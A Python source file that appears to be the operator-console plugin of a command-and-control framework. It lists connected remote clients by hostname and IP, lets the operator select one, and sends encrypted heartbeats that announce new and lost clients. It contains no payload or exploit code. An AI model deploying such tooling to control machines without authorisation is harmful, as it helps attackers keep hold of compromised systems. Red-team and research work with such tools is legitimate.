from base64 import decode
import json
from rich.table import Table
import time
from cmd2 import Cmd2ArgumentParser, with_argparser
import sys
select_parser = Cmd2ArgumentParser()
select_parser.add_argument("id", help = "Client ID to interact with")

class Plugin:
    def do_get_clients(self, args):
        payload = {
            "client_id" : "c2",
            "command" : "get_clients"
        }
        msg = self.encrypt_msg(json.dumps(payload), self.aes_secret)
        self.connection['socket'].send(("0"*(16 - len(str(len(msg))))+str(len(msg))).encode() + msg)
        data_len = self.connection['socket'].recv(16)
        data = self.connection['socket'].recv(int(data_len.decode()))
        data = self.decrypt_msg(data, self.aes_secret)
        data = json.loads(data.decode())
        table = Table("Client ID", "Hostname", "Remote IP", "Remote Port", "Connection Time", title="Connected Clients")
        for key, val in data.items():
            if key not in self.clients:
                self.clients[key] = val
            table.add_row(str(key),str(val["info"]["hostname"]) ,str(val["connection"][0]), str(val["connection"][1]), f'{str(val["info"]["date"])} {str(val["info"]["time"])}')
        self.console.print(table)

    @with_argparser(select_parser)
    def do_select(self, args):
        self.client = args.id
        self.prompt = f"({self.clients[args.id]['info']['hostname']}): "

    def do_back(self, args):
        self.client = None
        self.prompt = "(Connected): "
        
    
    def heartbeat(self):
        while True:
            payload = {
            "client_id" : "c2",
            "command" : "heartbeat",
            "data" : "none"
        }
            msg = self.encrypt_msg(json.dumps(payload), self.aes_secret)
            try:
                self.connection['socket'].send(("0"*(16 - len(str(len(msg))))+str(len(msg))).encode() + msg)
                data_len = self.connection['socket'].recv(16)
                data = self.connection['socket'].recv(int(data_len.decode()))
                data = self.decrypt_msg(data, self.aes_secret)
                data = json.loads(data.decode())
                for key, val in data.items():
                    if key not in self.clients:
                        try:
                            self.async_alert(alert_msg = f"New Client: {key}")
                        except:
                            pass
                        
                        self.clients[key] = val
                for key in list(self.clients):
                    if key not in data:
                        self.async_alert(alert_msg = f"Lost Client: {key}")
                        if key == self.client:
                            self.client = None
                            self.async_update_prompt("(Connected): ")
                        del self.clients[key]
                time.sleep(5)
            except:
                break